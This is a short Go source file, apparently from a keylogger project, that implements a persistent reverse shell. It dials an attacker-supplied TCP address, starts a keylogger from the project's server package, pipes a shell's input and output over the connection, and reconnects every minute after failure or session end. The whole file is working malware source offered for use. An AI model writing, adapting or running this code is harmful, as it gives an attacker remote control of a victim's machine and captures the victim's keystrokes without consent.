package rs

import (
	"fmt"
	"net"
	"os/exec"
	"time"

	"github.com/gabrielfnayres/keylogger_go/server"
)

func ReverseShell(connectionStr string) {

	// simple connection
	fmt.Println("testing reverse shell")
	conn, err := net.Dial("tcp", connectionStr)
	server.ServerSideKeylogger()
	if nil != err {
		if nil != conn {
			conn.Close()
		}
		time.Sleep(time.Minute)
		ReverseShell(connectionStr)
		server.ServerSideKeylogger()
	}
	cmd := exec.Command("bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
	conn.Close()
	ReverseShell(connectionStr)
}
